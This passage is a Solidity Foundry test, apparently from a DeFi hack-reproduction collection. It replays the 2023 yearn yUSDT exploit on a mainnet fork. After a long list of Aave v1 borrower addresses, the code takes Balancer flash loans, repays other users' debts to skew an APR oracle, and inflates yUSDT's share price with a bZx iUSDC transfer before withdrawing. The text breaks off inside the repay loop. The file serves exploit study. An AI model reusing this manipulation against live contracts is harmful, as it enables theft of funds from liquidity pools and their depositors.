// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";

import {ILendingPool} from "src/interfaces/ILendingPool.sol";
import {IUSDT} from "src/interfaces/IUSDT.sol";
import {IcurveYSwap} from "src/interfaces/IcurveYSwap.sol";

import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
// @Analysis
// https://twitter.com/cmichelio/status/1646422861219807233
// https://twitter.com/BeosinAlert/status/1646481687445114881

// @TX
// https://etherscan.io/tx/0x055cec4fa4614836e54ea2e5cd3d14247ff3d61b85aa2a41f8cc876d131e0328
// https://etherscan.io/tx/0xd55e43c1602b28d4fd4667ee445d570c8f298f5401cf04e62ec329759ecda95d

interface IIEarnAPRWithPool {

    function recommend(address _token)
        external
        view
        returns (string memory choice, uint256 capr, uint256 iapr, uint256 aapr, uint256 dapr);

}

interface IyToken {

    function approve(address spender, uint256 amount) external returns (bool);
    function balanceAave() external view returns (uint256);
    function balance() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function decimals() external view returns (uint8);
    function deposit(uint256 _amount) external;
    function getPricePerFullShare() external view returns (uint256);
    function withdraw(uint256 _shares) external;
    function rebalance() external;

}

interface IAaveLendingPoolCoreV1 {

    function getUserBorrowBalances(address _reserve, address _user) external view returns (uint256, uint256, uint256);

}

interface IbZxiUSDC {

    function mint(address receiver, uint256 depositAmount) external returns (uint256 mintAmount);
    function balanceOf(address _owner) external view returns (uint256);
    function tokenPrice() external view returns (uint256 price);
    function transfer(address _to, uint256 _value) external returns (bool);

}

contract ContractTest is Test {

    uint256 internal constant FLASHLOAN_DAI_AMOUNT = 5_000_000 * 1e18;
    uint256 internal constant FLASHLOAN_USDC_AMOUNT = 5_000_000 * 1e6;
    uint256 internal constant FLASHLOAN_USDT_AMOUNT = 2_000_000 * 1e6;
    uint256 internal constant YUSDT_DEPOSIT_USDT_AMOUNT = 900_000 * 1e6;

    address[] public aaveV1UsdtDebtUsers = [
        0xCCaAa3feCdd625CB4e0EdC2728121011caede655,
        0xfda180bbadb213Ce91C7D70771031B48bCaA09a7,
        0x929CB4b2501350dA5a33FDA2F6Fd9C818da65116,
        0x5fa23A19B37ae7c7CD49db44f459142A586Cc392,
        0x584495a3F4033f913aaDd0789fe5787aB0852Eac,
        0xe7a6B9d6EC7CDEA7487D6D1d83e0fB254d7b9653,
        0x63fB86F437AEe0dad657040563Dbb6bA7CA23d70,
        0xEFCFbCc6693B137fc2Fb62149a2cc48E1946e585,
        0x66541D275dA05a8513948a9D0f9547C6FCc62eF5,
        0x51A23045dB018780dd40C890C62368C187E8d179,
        0xe84A061897afc2e7fF5FB7e3686717C528617487,
        0xC96c7536D20808a39FBcE9949B3511E4198290C5,
        0xf398F0d68A70E5a1C78b03e7CF0F6BE54dA2d782,
        0x165f1a77C9861b8B943A9B60E9e7503076fD8d84,
        0x86683cB61BB9EBB8893Db3b82271166879c2502d,
        0x286a4289Bb294A961BD8a13A9922428b12549f6A,
        0xa0357704F7B78306f401A03d08d1D7b8a6555AcF,
        0x67659F1105a093023CdA611B9e3e09151700942d,
        0xB603318b7Ce72caAf8d54e697349398401CCc5f7,
        0xb6BF3d48e0808EeF3a5fBc92bB470aa17b67Ee9E,
        0xb50A98b218968d9D6ec895BE6850aB2807B763dc,
        0xeB874df4951bA627CFbe85b0CdB79e2ed7Bd30F7,
        0xFFbC745D5d91C8FC3E2bC6D65256EA596410811C,
        0x69DCB0A3AB51C7ADaf110e6f119D886989B53ec8,
        0x81C0fc11B5579EAD5Cfb848Fabec4137353C8bae,
        0x716034C25D9Fb4b38c837aFe417B7f2b9af3E9AE,
        0xd09A205a6Be5C053f5D1b0e650616828d6ac038E,
        0x10dDF9034C607B49C34865FBc548da3906AF19ad,
        0xFf8151d9A1f7E343546e87d0Abd9AfF759342C99,
        0x952924e66Af2Bf3985c4364a762dc39F083c984b,
        0x863A3bD6f28f4F4A131c88708dA91076fDC362C7,
        0x678308BD7eE9936F4Adb3EBAA5B7C857a5385CC7,
        0x14077eDFea6bd7C72aDc5e4Ac07C40761B2657ee,
        0x67b4fD59B100f4E71888441Aa8077718E7d5C9e3,
        0x50e6e023Ea32d01Ad1E3A1f3D3c1BDD8023D5784,
        0xD857A1a14666D3857a054230CAe3f363F89e8a57,
        0xA5A1568Efa0bE362Df9Fe3145F8311509d548BF1,
        0x11aF000Daa2ba3e4eF88e1152Cba860b24031C23,
        0xAc9c254c2f38d6350BcaAC3a9c97A6f80ED73451,
        0x231a19C04c6B314A395c915fFcf5d49e1E95cc34,
        0xE48500B4617e1Eb26c888b2c97Cf9055DBc38c16,
        0x8d8D912Fe4db5917DA92d14FEA05225b803C359C,
        0xD2c3d722E9fBa408CF33A0aBE0c3903419a5bbda,
        0x14796E88E8EEa7fE5c0dE48a4bb74B9Ef2526035,
        0x56850f01f997A6FAE6533cFFcd036CC6c0D659a7,
        0x20316E8a4818326a504BbBF96D476d6C94b1C4B2,
        0x009b080e90c67d93F292565873227fbCFd59EE12,
        0xf78c3E7b62c1Fb5C82BB83E88B636819d0F202c5,
        0x5C6f0E48e9eb6A8CDFaf4F00234bD8727a363484,
        0xfa811980282dF5f506474A187cfbfF449092e2C1,
        0xAca60b2e00BDCFE4017768D685D0f6dbe8B87E69,
        0xBea7ca7400fB2fb67b8CdF21E5640dD17745CAf8,
        0xBC67e6C2de6e9df08c59FC7EC16D2cC81449c3BE,
        0xc47E52bC5E399A374d942460160449f59F12AA16,
        0x073C841e832b7CC2e75d0FB1F8a98DCa355Bf485,
        0x64329fAF5Cf37C0A0A168b16c7d11c3b2b294bb3,
        0x308FfFc68707323D6746d57Fd3EBf5C01fa702A1,
        0x1F0aeAeE69468727BA258B0cf692E6bfecc2E286,
        0x00450992BC72AB99Ae55BcCdcE68E160412fdaC0,
        0xA71fA3312ec97ADe31B0b652ce199762083fdc62,
        0x5b5688bD28177eD97C27fE167F0aba3e02bF50e5,
        0xa5E5cfE3a0bD7148A85d46edD5c90fd9cBf614c0,
        0xcbe3958bB4C7122f3E67E481a5edd89277921E25,
        0xBb5BEA6880cE3A0eB4E0ced19aCe5E64A6ed960E,
        0xEB50840CdecB7DF40FA9fDB435922071865b65BE,
        0x618A9Df7c2Df1567583EB03926472Ffd7FcE5423,
        0x6fb1Df77f438b4d97053aE71F1A33245B0864F45,
        0xE9E143978494e75B2B46E0264Eae51D703B9DE4e,
        0xD41e5C84141280f31b6e06247397089b62432Ed3,
        0xb01624140905fc2642E7b942fA3de24B8F51a3c5,
        0x05fe314D744469227bD42c36ae435c5602307D14,
        0x549224E2d7aa5B761277425427e0A137278E5E95,
        0x8274561364955E31D66b48a4616D139F06884576,
        0xaD346C7762F74c78dA86d2941c6eB546e316FbD0,
        0xb622EBEB511b91b19B4C0470c9D77220C31012bd,
        0xEbDFd63f69A5ee9F31897938B95c9accd430D5BF,
        0x3c4C616B12F5bFeeC09A5ccd996B6Ee778855735,
        0xf34Ad271047697d13CC9a984BadC24019D371e13,
        0xB99c097883d7e037895C339ce14B3251eAd70279,
        0xeFad6FB4074f7445955fB8D1B5F8fA1B24B6e245,
        0x1EDc1E945Ae0D7e142Cc0138500837A1c4445464,
        0x92c42259d26405CEa2AA1E8258fdacF5204da5dc,
        0xb222C27b2999D73ABcE3115bf400861e48BF1f32,
        0x28691DaAed65fD5617597DFa19710209Fef2FFC0,
        0x4f7D7FEbcE2896C44A667B8b785cdF32B01154f0,
        0x614608F5b513e1e6B337aFD162DA9935D0215B7e,
        0x6cD5Cf02B1f7089813a3309102Ce902bc58AA317,
        0x0C7CD0c75fE9fE9937633190E8d832aF1Ab5A467,
        0x1A26718a51074976d05C59a3C512f4994c88321c,
        0x9C75A0E4Bc1f05ad7DA5df534F96872Bf3E14AfD,
        0x1aD8F000063ffC26385bf341F0063d680B4f96f4,
        0xEf8a47C8Da817fb5a9be047E2d2E30e964AF4341,
        0x04EB04196f16D2D87155C4E5ed4E782C7Cb1bBD3,
        0x2aF8901ef369D1029160A3e4F48118535830dC2d,
        0x9cC53761302093cd4a107769586C7750707a3E3e,
        0x8aa28f14fcEE3aE12Ef3539C00327b6D4e7dD602,
        0x9F9EBCE72C0715CdbAD4d589986EB22F6782A1CE,
        0x663694857eb8a7432559f5C099A20bac59287D3a,
        0xEaa593aDE3570a12E9C68522BAE65278a45e41ec,
        0x864e9eF223C2Ac3F57bb12389bde47CB49D018E8,
        0x8d05F4950832EF0909bcbC9Eb48Bc779214f631C,
        0xC010CCFEdf9FF2Fc96Aec5Cff2E3A81b306F7B5e,
        0x1E261584C9f29E1e00920561e59BAA0C77289765,
        0x6E90Fc0e1C03CCFaFa6275AcA82b2D7ef67241f7,
        0x107FE2152EE2f585711a6Ea58f755d9a3b8eF119,
        0x25729a66D3f954C0c920b79F81a40018D4F64Dc6,
        0x482562904a8990c55d7D58Ea318BDe477931a168,
        0xb01F6c7c4e78a6C5f3F9Ec3e35D1B849d079425C,
        0x294dD9107B72AE43366cFc704487AC2d587e325F,
        0x9F3C2254414c852b83C727B257b6EaB9418cF914,
        0xFB50F47D1aA75662d199A8cdcbbeb0e8D2df17b5,
        0xC20f93173E270eCf5F05C72596b4B7BFC020788c,
        0xC67fBD493097fB241EEb8500E8D7aD412B0C463a,
        0x5fe0c4d3bB3d2dB4D9fFE6cd6b97e890bc052B5a,
        0x15D2B4F3E004a88a909021B6C7801b6aD0200c6D,
        0x23A234303C552e8145D069dADb4D73a86EdBfE42,
        0x556C9Cc9C366a4c37EB014D5273861bB543f9f14,
        0xF8298fCFA36981DD5aE401fD1d880B16464C5860,
        0x25E80691C89cc8F25Bb832a3Ff2d656b071f70Eb,
        0x7fB2fb92eb46D757D9CAe1506571C29964B8dc96,
        0x6c40B85434C4b0e7fe7fD080266A8C501eFFe3f1,
        0xcFA6A349a1e9c5f3bF109D5F00232F3855004567,
        0x671bCe52d3f74fD014C4F294a8e2d00C02a18E36,
        0x19B39B2C227116531f2DEc9D7282374f1bB4041D,
        0x623F0039838B3512F3986fE65158fBBACc1B813C,
        0x9dEBb56C9F73f8255e179c1BA9B7fBF6C422e866,
        0xD70B7Ea3194D5538c5C9606E2063f97c677e22d4,
        0x3e351D59929B7F4FE174A29AD285C11bfc528bBf,
        0xE5F10E386f758b3770B9B87ae8e5433DD42CDF7D,
        0xB3866f8b4Bf5A9Bf6C44823E2795f9592a287CbB,
        0x837b764F2Ecfd979c948361804915D68DB926a49,
        0xEB13217fb0f918be08a5b9770e08c271F08Ed449,
        0x2487f3497706dE6bcd0B755435014f0aA170BF06,
        0x8ed591ff208E9116D558B15C34BFD9C2562b41E4,
        0x1D3643399e5534dd49f2B04F2f0615153bd209fd,
        0x381712d37b333164aEe06f26293a45339359c140,
        0x11a73c4fd819EbCaD10dB9D212f8471ba8A5b646,
        0x51d3bd23A4FFD9C0e4305E2D27d4D9f55D3cE7c8,
        0x6c068858140829F7fddD7907bCa518e6b97c7274,
        0xF86cd7b665D9fd08017978852c0859DB07748356,
        0xeaB8AA960Bed683BB31895D802dD71cF6aee4545,
        0x9afDa15071686B4131fcA4F8ec5950f69849eBD4,
        0xEB27Ae58D1980D4c5726409c88Aa14e9dd733fc0,
        0x13eCfdd96A4cdc95CFFCFc1B6CB6C42D9FB673AE,
        0x3F66b19b458E8d823EC2aA8A243938Af8CA374E2,
        0x38C96729CBc7AD2467cb43fb86509BA7Da010F27,
        0x0eFB605dBB1F99b65D020cD0A672CA3d0f92D4A8,
        0x02EAA99393e802FaE56BC7f66634DDb4757a19F0,
        0xeE61bfBfa070384C4b2c0bD5bf15c7Cb82AcFf5a,
        0xbDE61412Ca9f899239671118Fd1Ec99E70195de7,
        0x90B30F9387d67A1F722A600029D2F7615c2e0e70,
        0x819B4974cf21F7f261279fDb8Ec01eBC8629635B,
        0x0db15b403AE023b1C9B07e95D9294710514292aC,
        0x568B34F34ABdc7F1D9D388c09020182E90EEa4B4,
        0xB3CEc0AdF54A404146247eB7A63083C9b9E65675,
        0x8667DC23FfEb3467a3a15720AB2b9A013bc0db01,
        0x39D637737Cc76C5849a52c7D3b872a1Eb22Aa71c,
        0x43E5959343CD9154080c235C16fBB4bBd7F83E70,
        0xb52d61cF08C7528F456234234C65bda96f49080c,
        0x334ca9Fa33B2560a0fC6CDB2E5B95A28EA3005ed,
        0xB4AE18A0EEBa9448e5257a82c4347cBd655e84b2,
        0x335247C96C09EEC2b86f88Fa09A217777a3AAebB,
        0x0AAf72DA643570Da1bF76E8b3063C3f378b3D3D4,
        0x1eC0Ae8b30c0347Bc2F579a076aD3DBa2960E560,
        0x690485ac4dB3EE87E9f6529840ab81400FfD042c,
        0xd8f9eC757fd95Ca40Ea1973CCeA1D66a32a812dd,
        0x648dB0fb67efa4F23ACE47e3e1Da273E001ADF8e,
        0x3cc542c4198990bcD1C98bc6af99865DCEEBc6a4,
        0xd90dd2CCbbf202e229a6f0186b76F7758778D2bc,
        0x86FD9b8243abB944bca16E69344756FD2501CF45,
        0x7cca75755730512f0b244dE4D19ac499BB0E901C,
        0x63338AeBc72Fc70Fb6a1327F7C1420cbDD9361E4,
        0xCF2db24e539b9d7Ae55862409F8CcFeCB0267668,
        0xa33DbcB9aA351f656BA954c77Ff004f71AF2B725,
        0x1dd3feC0B54FeEa4B7b967E176496c353d602Db4,
        0x5Dcc979c0E3c12261F73c07AD90b909C5F8B95Dd,
        0x538DeD4D0d461206AE8E0c021d5179D3a31D2b12,
        0x9Ef649A03ee6c83f12BDB9e88293b607FF69575f,
        0x5e0a088942EC09C9Ea98aE237625f063A3BeD237,
        0xAb4dBA7D9D2f650c5516cF3E0f9187E8D54A075c,
        0x8ca7ED9b02ec1E8bEee868a32495Ed5b157eeE08,
        0x68b7a8D734920b3906dD826201a3DC4c94D10F01,
        0xc9540Ac5e0336910AECAF67Fe86482DD709f291e,
        0xc607B038b2Aa9dFB8344635C5d90cE78D8D4A89D,
        0x9Cc74Fc95F4ABEca2398c27C7465542Ea7f7639f,
        0x8Ef75caE3A505f0Cba89B9257d57e35742c17D04,
        0x13b3Eb7758A7CFAe23cD2aADA7D23566f02614DF,
        0x768867f0e1EBa753Ce526C26cB4979116a844Ca0,
        0x0675182195661f8FB984F61c98842628382702A0,
        0xD9A55Dc1937E504971e75181be9dEb82ee273fC8,
        0xFCeB09c56a67800827Aa1Ca671488E5F4589de8b,
        0x70bef05BbAF710bc6A3a278b00109f4a1b8DeA48,
        0x0D1C2d885B5a5841e9304223fAb0C6138b5fed81,
        0x56bb46dD796f90e23A87721465baEeDD257Be6F9,
        0xDBfdD975CFe231cBeEFde1Ec0bcB2CB28BCca063,
        0xfd0069BfEE8017a9056987bfEE2A1FED4b267b5A,
        0x229Aa26280E5b22D856d3A9112FAbE5f724e603b,
        0xB98FE52B9d7Be52270ff6fB21d04Ca2F160E56bD,
        0x68E48c7A395B5431bAd9093b15558Adc46D0fA7B,
        0x3dE6A79c8d6Be555e13C0816c78141329842B386,
        0x8764C54E16304A26cd9356635431ce9a709D634C,
        0x3e81e51Dc494396E01404c7cca1c9F30DFd661F5,
        0xF2962c0d490a243FBD6C66A199517f0fFb5cA185,
        0x04bF2B4D95163D4Be53f1F1A7DC8FF21968e5d62,
        0x1882aFaF3D2E3aFbe6Ff1A4249dA911495972bf3,
        0x2b021aFa5EAb3d8de29Ed8210b33122d0A44fA1E,
        0x7689F17560b5eE53799f0b37C975927E1258fbB5,
        0x1acA957104d5a19280AD91F720dEe1fddf9f358b,
        0xf28225edafA505a8bCF1a034442C89e0675fCa24,
        0x7f81256C9b75F37154298DE82414cb7F394249DF,
        0x5247E060a978D2a7b39029cc39C9c7cba15dea16,
        0x30F837CB95BD29411a58b77A539B021f57749dAD,
        0x304B9AE195211778778d0Caf07937b11929BA58b,
        0x2dc84Df1AC33684eB2938E398Aa79D439114B17b,
        0x76aFd547c5178D1B9b7A4123e298c39f49884E39,
        0x85162b355EEE83eD8d29c3caDA25B80cA86e80d1,
        0x5B58889678fE7641ba90e90E6a42dc6A0AaB7335,
        0x8F0942C2b24B4BEEeE056e801D87C7567d0c864A,
        0xC2A8728496Be486950Ab1754B8C7fE23F99C05A5,
        0x5198B654168c4b23844E8797A8cb4975Be6834B4,
        0xBBcD13Ff937E312e476Ea29179E1934cE3162078,
        0x5c7Efb1067eF301046F25210720c161490017a8A,
        0x7Baa4186DCeD1d3b2984Dc96431c4Af8534D659b,
        0x7578677c420B5505cf2AdF6ABd3Dc29e6268c5b4,
        0x91695c3EF22E1Ea87501a80B966d3b7f79c78050,
        0xFf38a08048015E62177b7f137cDb65B4b1ed91fa,
        0x752f6B0BC8E3ad5bE605D356C03F6F42F41574Fb,
        0x1e348B2185e0018C8CdD4b003B55437E8F644431,
        0x6a7904F0ba2dED9c41a8B03a36b3880c174a5597,
        0x4D373f91176f17c825487091d50cb6760F934797,
        0x22ED8d070Bc14A1213c845314AAD7b28b7924ee1,
        0xA98C3f80D33bd0f35C4B37D7777d64D651544b4E,
        0xa7CEEb709F34019a4306e21B538cD1c06b88038e,
        0xE0f96162b3dD3AcE2BA1a8b3c964F32ae2a04b11,
        0x647E43A9fc3c0cC5bB77358d2c0FD236C752B512,
        0xeBEBc6b04E844Ab5498f29b1083B11d06249aE83,
        0x09d3D3B086257940CCf4D7CB20A3e580730AfB80,
        0xfA4FDc9849De525E52783A7A6A11D2f5fe8A3060,
        0x77c2401Ca6eF5a13fE062102fd59eD4070a55C4D,
        0x42Cf853738F773DafFcc0B74936E72B44699C1BD,
        0x97E63Aafa1ef71EDE6c4648ee5e855B54569ab20,
        0xA595E168ebF3cDa469C0886df9afF2C1A1005922,
        0xAEBdD57C119dfa0DC86018cfc5bC6fCf9ff6Dd45,
        0x7276fCE3Bf648aB2E4b83cc77A4Fd1bD3B28E2f8,
        0x0ebcBeDC8D8498CCD1013B84db583358604D3F90,
        0x1D446d0B05AC66Bf6F4729b50f71Ef4f10A4c554,
        0xA38D1A0555287cc7d15e98B5d3aEA30Aedd08fD8,
        0x63735167b3862a41524A833D11bb14D18E72ca79,
        0x6d36cCDa61370f1401590F9022fFcB5b71af6142,
        0x8Db899678B80Ba29D5C5634905F6e68c8c259a77,
        0x427F9c90C4A3d31287d424139B2A36535E5184B6,
        0xEA5b95196e8D89aBC3Da571B4B5a3d8478Bcdd1D,
        0xa50b080F064E22b990776c90D004b0aF843a4Cd5,
        0xBa49c31C9EBBffa150aCa2BB02aC7DFcf24d4BE1,
        0xabab0ae20dDe05D20EFdA6063915B327e93721f9,
        0x222b1E66858DB35c7F86509625D4885121FC30C0,
        0x6f08A6A445F41d65A19858e98d8C98f462a30b73,
        0x56D1C1Da59cFdA36d5FCc64eD7a979f9fE2617F8,
        0x8112a46619829277352f46c2323f64809DC396A7,
        0x3278776fdb3a3d786c93f3BFbCDD5862aA49a7Ef,
        0xC3c2e1Cf099Bc6e1fA94ce358562BCbD5cc59FE5,
        0x67Af302e2F1125a9A91c61E6e8CDcCBda23191b0,
        0x15D2c48F4552A6C9519cc89c49E661e1Ed30B80b,
        0x9e77162D6e50e6d8BdB5E0de7dA8653e21F63350,
        0x324D4F9d245060cC29AE2417033E883FC6784AF8,
        0x5a230aB790ABd2771E2448B49E63e16b8032d5e9,
        0xBD186D41F6C2D1BD6EB56A7eeB2B45B97b58E31b,
        0xa90813eA4dE6df92963113ACAd39E675b09Ded5a,
        0xE469552F50e735f2D5eBe72a36de0a8248e88e1F,
        0x9e22eF6fD72CFc0CCd39eF65E59b26924083eF38,
        0x0202fb82B2C2e8b6c338882eefC6751e7956686E,
        0xED1E2B03928C17dC1782d846CbC48659f3a31bE4,
        0x285CBeDEF8B3602553ab465a35516af5c962fA1E,
        0x22AF60771D0ea607557FFb58DcD50B4778671384,
        0x0F32824238bcF4aD56dCa68B779657e7e8e732b0,
        0xab8a63196acad2A365cD2aBCD1A9911Fa66c7Ce6,
        0x913466dbD152D003B78E65768eeB89c9Ed4Ee5B8,
        0xd3e70deB764B72DCa712eBa2d419988501f01cFE,
        0xB11D91B7630230894f63b469709D63887e3b5fCf,
        0x5d5d08393e5bC93078F83a6a0B9077b474B9bAD4,
        0xAfa76704baad5aEB771C122cf1AA828524Ea7803,
        0xe3B180caCb2549F54b2e142a7e04fc1872Ab11B3,
        0x8419D7ddD58607510EbE98626b76A7BF853b19e2,
        0x5728a6345c8be559d9d5465Cfbf0C2B2384d41A7,
        0x4b8A718F7FA74e969a333BfFf9021bF217C7A5E5,
        0xb98ab698423c9a0a1774d0684e13EaAc58bBDBA1,
        0xDAbbEb81d83Ff9c2A83E4df1f716e994B30B47Fa,
        0xa8B941C709FDbC5ea9D2886158044e2B7F068Ddb,
        0x4fE345A9aeB00c12F87280651978c0dCf8f68096,
        0x8BC646D9C87396D81Bc42485984b48937Dd2280F,
        0xdC7D0D897e1B7998c780D16b3C08482A74e71F33,
        0x354eF9A0cb7aD571E039221E0ABB505b3da69598,
        0x44B5f2Be03C8aEad6a33a183EA603E4442CCFF24,
        0x9502741EEeaAbae617F7C3840434Ae9A1F51c440,
        0xcC16c82F55114a53aa3B41c4A31Dc3c2682CE375,
        0xBBCcf6CaB5b3AEC26b0CbC6095b5b6DDBacfd59a,
        0x9FF5146D1Cef23741133200514d27EC89Eb5f4AC,
        0x852E9278f76aAD35f9dAAe25fE89c7514cf29A78,
        0xbf2116D0a79da0E5710Df8AB00eb20415bCA94C8,
        0xb4c8CddC137f46348231C937C4d36B643320af22,
        0x1bF6Fab552827C844a639283214d79b1002efc45,
        0x0c49209DEe1B14A8d36f51446f581680CB777114,
        0x8d54EB6815574bd426bE06f9748d8b5b6638C61a,
        0xdd3745287A5f3f87fb3964ee32a4b1a64e6fcFa4,
        0x58F7f1447f5cbaC809E8870333754455243c8760,
        0x295790f201ADcd1712394CC99bc49391D72CA923,
        0x52bbb9C9412bDBf23444498Badd15Bf76E531E66,
        0xae61a0e517B743DA4eC90f27a664D3D8643F46E2,
        0xc28E21B841487f6a50ACbae4D09D7F4d4D012BCC,
        0x3DEB9C1966F8dB9f8DC8189e3Cad8E55e2378338,
        0xc5a61D56CA395FCB87f148532369595E31286d0e,
        0x0D80B3000b3170F83602190867c905b768dC1Cc5,
        0xba9372513C59de78CB0Dc38F73A7741478816715,
        0x947c8b3deb1014774850Aa8864f8Fc568CcdB3af,
        0xbC577f62fBc443219dF98f35981ACDD966178Ad1,
        0x0453E1Cbb8e2379A038e804660ce43d07b339dab,
        0x2602cda64237b42a8c90c33bD7074EdD1f4c0707,
        0x9F6A73FC24c93A58113c51Fa42dBe64905BD4C4a,
        0x41590Ca7AeDe20945014f63e0Af704c5b5AB52eb,
        0xda874F844389df33c0fAD140DF4970FE1b366726,
        0xb67F1976A1E7AF8972c06d03465CCa14698C82B9,
        0xa5c07B2C9D55De33D3b9d9bf1C36A8915140fD4D,
        0xde5A9eC8CA1DC78e775E1Bb6b1e7BCc958534Baf,
        0x706c642De05dC82380d884C9213c205b18CE8cB9,
        0x2FA5114AB48ADD8EF16B2E1B657199Bf943E766F,
        0x022a29ebE2Be30F0c7FfC7dC9C51fFd3714762d0,
        0x06Ee0E909F0279CFe2794A6590527ca3E6b73FFB,
        0x0866dEedF98FB951db0e03aA1b3121B511CE808D,
        0x94E70b76Ea709E33f2f41b35Be0f2F1D94cE799a,
        0xEe3a4aD02eD31f6Ee8c3B6b3335A71fA997e28E1,
        0x6fEc03305fBF8F8Ac4e8E589Ef2812a0C11BB2c0,
        0x7644972C02Fbc91eD2FD5eE0BB7B6Bb3d67e7ffd,
        0x6f2d3E996b0493453357839985Bd54ED9FC9151D,
        0x18D1Cd1002A96FA1a5ccaa9983e9Ea3DC51eC92F,
        0x2471a0dc634c8961719e4Ad5bdb7e401f5d09BBc,
        0xb53c7b5c6E8204f8b61f4CB91632D6287f1b757c,
        0x19EDB253d915fC2d0608F4A885EE285dFf2C7ed4,
        0xCC2Aa1aD65dee9D2B936D69b62bf75f908B1ebFe,
        0xdBc58c91bFfDaB3c7894d86AcB11BA938C456b93,
        0x91D6E260A5965a3C33D5Bc4bf4ADCF96C449ED2e,
        0xbA8ec79997bf5010D68c082663a311B24e618a64,
        0x5d6cA5d9838Ef551bf4c52b8A47B69B60694F1cC,
        0x32D7276155f95912c714dceF0Dc16b10cfc0594d,
        0x8D9BED65B4Cd3Aa13212577c2d9412446F22FcF0,
        0x7Be1f3e4ad6A254A1bCd3d9DfFa78C2A08F14378,
        0x0088fCCe2694eA96Ad417441A61913c41e90f176,
        0x48e0568ed2406176e61c15FeBdFD6F0c81A84eE0,
        0xD3EF22C162281F10D3683ED1d44FaD40814F395d,
        0xc504c02cf3201199bd7961d6569b6cD6Deb672BB,
        0xF29de94cfeb49852453B82905aF368DEb7Ac377e,
        0x35d04f4F70f39D402Ba2c2A93180E700b0a5611c,
        0x20a039E4906bBc7767589EefC191Fa6aAf8Cf06E,
        0x58fb797fE7C1D578d8deac552662101843eF0C4f,
        0xc550B7d0f722aE0Ddd986e4EDF75F106bDdb1499,
        0x3E4a1aB95c12b0D48B1B720E563E812B466B3fD8,
        0xdFBc9D61aC333255Ed1d63DE1bC7BF2cb4643A2E
    ];

    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IIEarnAPRWithPool iEarnAprWithPool = IIEarnAPRWithPool(0xdD6d648C991f7d47454354f4Ef326b04025a48A8);
    IyToken yUSDT = IyToken(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    IyToken yDAI = IyToken(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01);
    IyToken yUSDC = IyToken(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
    IyToken yTUSD = IyToken(0x73a052500105205d34Daf004eAb301916DA8190f);
    IAaveLendingPoolCoreV1 AaveLendingPoolCoreV1 = IAaveLendingPoolCoreV1(0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3);
    ILendingPool LendingPool = ILendingPool(0x398eC7346DcD622eDc5ae82352F02bE94C62d119);
    IbZxiUSDC bZxiUSDC = IbZxiUSDC(0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f);

    function setUp() external {
        vm.createSelectFork("mainnet", 17_036_774);
    }

    //tx:0x055cec4fa4614836e54ea2e5cd3d14247ff3d61b85aa2a41f8cc876d131e0328
    function init() internal {
        usdt.approve(address(yUSDT), type(uint256).max);
        usdt.approve(address(AaveLendingPoolCoreV1), type(uint256).max);
        usdc.approve(address(bZxiUSDC), type(uint256).max);
        usdc.approve(address(curveYSwap), type(uint256).max);
        dai.approve(address(curveYSwap), type(uint256).max);
        yUSDT.approve(address(curveYSwap), type(uint256).max);
    }

    function run() internal {
        address[] memory flashLoanTokens = new address[](3);
        flashLoanTokens[0] = address(dai);
        flashLoanTokens[1] = address(usdc);
        flashLoanTokens[2] = address(usdt);

        uint256[] memory flashLoanAmounts = new uint256[](3);
        flashLoanAmounts[0] = FLASHLOAN_DAI_AMOUNT;
        flashLoanAmounts[1] = FLASHLOAN_USDC_AMOUNT;
        flashLoanAmounts[2] = FLASHLOAN_USDT_AMOUNT;

        bytes memory userData = "";

        balancer.flashLoan(address(this), flashLoanTokens, flashLoanAmounts, userData);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        curveYSwap.exchange_underlying(0, 2, FLASHLOAN_DAI_AMOUNT, 1);
        curveYSwap.exchange_underlying(1, 2, 3_000_000 * 1e6, 1);

        uint256 aapr;
        (,,, aapr,) = iEarnAprWithPool.recommend(address(usdt));
        emit log_named_uint("[INFO]  Before helping aaveV1 users repay their USDT debts, APR value", aapr);

        repay();

        (,,, aapr,) = iEarnAprWithPool.recommend(address(usdt));
        emit log_named_uint("[INFO]  After helping aaveV1 users repay their USDT debts, APR value", aapr);

        yUSDT.deposit(YUSDT_DEPOSIT_USDT_AMOUNT);

        uint256 amount = (((yUSDT.balanceAave() * bZxiUSDC.tokenPrice()) / 1e18) * 114) / 100;
        uint256 mintAmount = bZxiUSDC.mint(address(this), amount);

        bZxiUSDC.transfer(address(yUSDT), mintAmount); //Raise the price per share

        uint256 sharePrice = yUSDT.getPricePerFullShare();
        emit log_named_decimal_uint("[INFO]  Transfer bZxUSDC, increase the price per share to", sharePrice, 18);

        uint256 withdrawAmount = ((yUSDT.balanceAave() + yUSDT.balance()) * 1e18) / (sharePrice) + 1;
        yUSDT.withdraw(withdrawAmount);

        yUSDT.rebalance();
        usdt.transfer(address(yUSDT), 1);
        yUSDT.deposit(10_000_000_000);

        curveYSwap.exchange(2, 0, 70_000_000_000, 1);
        curveYSwap.exchange(2, 1, 400_000_000_000_000, 1);
        curveYSwap.exchange(2, 3, (yUSDT.balanceOf(address(this)) * 100) / 101, 1);
        yDAI.withdraw(yDAI.balanceOf(address(this)));
        yUSDC.withdraw(yUSDC.balanceOf(address(this)));

        usdt.transfer(address(balancer), FLASHLOAN_USDT_AMOUNT);
        usdc.transfer(address(balancer), FLASHLOAN_USDC_AMOUNT);
        dai.transfer(address(balancer), FLASHLOAN_DAI_AMOUNT);
    }

    function repay() internal {
        for (uint256 i = 0; i < aaveV1UsdtDebtUsers.length; i++) {
            (, uint256 amount,) = AaveLendingPoolCoreV1.getUserBorrowBalances(address(usdt), aaveV1UsdtDebtUsers[i]);
